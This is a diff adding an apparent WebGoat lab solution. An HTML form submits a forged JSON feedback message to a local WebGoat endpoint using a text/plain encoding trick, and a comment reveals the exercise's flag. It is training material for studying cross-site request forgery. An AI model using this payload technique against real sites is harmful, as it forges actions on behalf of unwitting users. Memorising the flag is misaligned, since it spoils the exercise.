@@ -1,0 +1,25 @@
+<!-- In this section we will look into another way we can perform a CSRF attack against a APIs which are not protected against CSRF.
+In this assignment you need to achieve to POST the following JSON message to our endpoints:
+
+POST /csrf/feedback/message HTTP/1.1
+
+{
+  "name"    : "WebGoat",
+  "email"   : "webgoat@webgoat.org",
+  "content" : "WebGoat is the best!!"
+} -->
+
+<!-- Flag: e8abbaa2-d258-421c-9c48-ec8020aca5bd -->
+
+<html>
+<body>
+ <form action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message" method="POST" enctype="text/plain"> 
+    <input name='{
+        "name"     : "WebGoat",
+        "email"    : "webgoat@webgoat.org",
+        "content"  : "WebGoat is the best!!",
+        "ignore_me": "' value='test"}'type='hidden'>
+    <input type="submit" value="Submit">
+ </form>
+</body>
+</html>
